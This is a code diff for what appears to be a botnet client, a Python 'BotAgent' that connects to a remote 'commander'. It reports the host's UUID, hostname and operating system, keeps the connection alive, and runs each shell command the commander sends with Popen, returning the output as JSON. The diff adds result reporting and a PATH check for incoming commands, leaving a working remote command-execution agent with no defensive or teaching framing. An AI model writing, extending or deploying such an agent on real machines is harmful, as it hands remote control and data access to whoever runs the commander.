@@ -25,15 +25,16 @@ def load_conf():
         idle_timeout = int(config_parser.get("CORE", "IDLE_TIMEOUT"))
         conn_buff = int((config_parser.get("CORE", "CONN_BUFF")))
         recv_tout = int((config_parser.get("CORE", "RECV_TIMEOUT")))
+        hello_freq = int((config_parser.get("CORE", "HELLO_FREQ")))
     except Exception as err:
         print("Error initializing CORE, bot agent not started because config file could not be loaded. Unexpected "
               "exception occurred: {}".format(err))
         exit(5)
-    return host, port, max_reconn, conn_buff, idle_timeout, recv_tout
+    return host, port, max_reconn, conn_buff, idle_timeout, recv_tout, hello_freq
 
 
 class BotAgent:
-    def __init__(self, host, port, max_reconn, idle_timeout, conn_buff, recv_tout):
+    def __init__(self, host, port, max_reconn, idle_timeout, conn_buff, recv_tout, hello_freq):
         self.host = host
         self.port = port
         self.hostname = gethostname()
@@ -43,6 +44,7 @@ class BotAgent:
         self.recv_tout = recv_tout
         self.idle_tout = idle_timeout
         self.conn_buff = conn_buff
+        self.hello_freq = hello_freq
         self.sock = socket(AF_INET, SOCK_STREAM)
         self.reconnect_count = 0
         self.__check_uuid()
@@ -75,7 +77,6 @@ class BotAgent:
             self.sock.close()
             self.sock = socket(AF_INET, SOCK_STREAM)
             self.sock.connect((self.host, self.port))
-            self.file_stream = self.sock.makefile("b")
             self.last_online = time.time()
         except Exception as err:
             print("Unexpected error occurred when connecting to commander: {}".format(err))
@@ -111,8 +112,7 @@ class BotAgent:
             self.__self_identify()
         try:
             print("Sending botHostInfo from bot-agent {} to commander".format(self.hostname))
-            self.file_stream.write(payload)
-            self.file_stream.flush()
+            self.sock.sendall(payload)
         except Exception as err:
             print("Unexpected error occurred while sending botHostInfo of peer {} to commander: {}".format(self.hostname, err))
             return False
@@ -137,8 +137,10 @@ class BotAgent:
         match msg:
             case "botHostInfoReply":
                 print("Bot-agent {} received botHostInfoReply from commander".format(self.hostname))
+                self.last_online = time.time()
             case "botHelloReply":
                 print("Bot-agent {} received botHelloReply from commander".format(self.hostname))
+                self.last_online = time.time()
             case _:
                 print("Bot-agent {} received an unknown message from commander: {}".format(self.hostname, msg))
                 return False
@@ -151,12 +153,15 @@ class BotAgent:
         except Exception as err:
             print("Unexpected exception when deserializing message from commander: {}".format(err))
 
-    def __build_json_payload(self, msg):
+    def __build_json_payload(self, msg, optional=None):
         match msg:
             case "botHostInfo":
                 d = {"message": msg, "uuid": self.uuid, "hostname": self.hostname, "os": self.os}
             case "botHello":
                 d = {"message": msg}
+            case "exeCommandReply":
+                request, response = optional
+                d = {"message": msg, "command": request, "result": response}
             case _:
                 print("Internal error, json payload to build didn't match any supported message type")
                 return False
@@ -173,6 +178,7 @@ class BotAgent:
             if time.time() - self.last_online > self.idle_tout:
                 # Send hello to commander so that it knows this bot-agent is still online
                 if self.__keep_alive():
+                    time.sleep(self.hello_freq)
                     continue
                 else:
                     self.__self_identify()
@@ -186,10 +192,36 @@ class BotAgent:
                       format(self.hostname, err))
                 self.__self_identify()
             if data:
-                self.__process_command(data.decode("utf-8"))
+                response = self.__execute_command(data.decode("utf-8"))
+                if response:
+                    payload = self.__build_json_payload("exeCommandReply", optional=(data.decode("utf-8"),
+                                                                                     response.decode("utf-8")))
+                    if payload:
+                        try:
+                            print(
+                                "Sending {} from bot-agent {} to commander".format(payload.decode("utf-8"), self.hostname))
+                            self.sock.sendall(payload)
+                            self.last_online = time.time()
+                        except Exception as err:
+                            print("Unexpected exception for bot-agent {} when replying to command {}: {}".format(
+                                self.hostname, data, err))
+                            self.__self_identify()
+                    else:
+                        self.__self_identify()
 
-    def __process_command(self, data):
-        p = Popen(shlex.split(data), stderr=PIPE, stdout=PIPE)
+    def __execute_command(self, data):
+        try:
+            popen_payload = shlex.split(data)
+            command = popen_payload[0]
+        except Exception as err:
+            print("Unexpected exception when splitting command received from commander by bot-agent {}. Will not "
+                  "process it and just move on. Error: {}".format(self.hostname, err))
+            return
+        if not self.__which(command):
+            print("The command {} that commander has sent to bot-agent {} is unknown. Will not process it and just "
+                  "move on.".format(command, self.hostname))
+            return
+        p = Popen(popen_payload, stderr=PIPE, stdout=PIPE)
         try:
             out, err = p.communicate(timeout=15)
         except TimeoutError:
@@ -203,13 +235,22 @@ class BotAgent:
             response = err
         else:
             response = "Empty response from bot-agent {} for command {}".format(self.hostname, data)
-        try:
-            print("Sending {} from bot-agent {} to commander".format(response.encode("utf-8"), self.hostname))
-            self.sock.sendall(response.encode("utf-8"))
-            self.last_online = time.time()
-        except Exception as err:
-            print("Unexpected exception for bot-agent {} when replying to command {}: {}".format(self.hostname, data, err))
-            self.__self_identify()
+        return response
+
+    @staticmethod
+    def __which(executable):
+        def is_exe(f_path):
+            return os.path.isfile(f_path) and os.access(f_path, os.X_OK)
+
+        f_path, f_name = os.path.split(executable)
+        if f_path:
+            if is_exe(executable):
+                return executable
+        else:
+            for path in os.environ["PATH"].split(os.pathsep):
+                exe_file = os.path.join(path, executable)
+                if is_exe(exe_file):
+                    return exe_file
 
     def __keep_alive(self):
         payload = self.__build_json_payload("botHello")
@@ -234,6 +275,7 @@ class BotAgent:
             print("EOF received by bot-agent {} from commander when reading input stream. Reconnecting to commander"
                   .format(self.hostname))
             return False
+        return True
 
     def __read_buffer(self):
         buffer = self.__read_initial()
@@ -246,6 +288,7 @@ class BotAgent:
             if b"\n" in buffer:
                 (line, buffer) = buffer.split(b"\n", 1)
                 data_list.append(line)
+                return data_list
             else:
                 more_data = self.sock.recv(self.conn_buff)
                 if not more_data:
@@ -270,5 +313,5 @@ class BotAgent:
 
 
 if __name__ == "__main__":
-    HOST, PORT, MAX_RECONN, CONN_BUFF, IDLE_TIMEOUT, RECV_TOUT = load_conf()
-    client = BotAgent(HOST, PORT, MAX_RECONN, IDLE_TIMEOUT, CONN_BUFF, RECV_TOUT)
+    HOST, PORT, MAX_RECONN, CONN_BUFF, IDLE_TIMEOUT, RECV_TOUT, HELLO_FREQ = load_conf()
+    client = BotAgent(HOST, PORT, MAX_RECONN, IDLE_TIMEOUT, CONN_BUFF, RECV_TOUT, HELLO_FREQ)
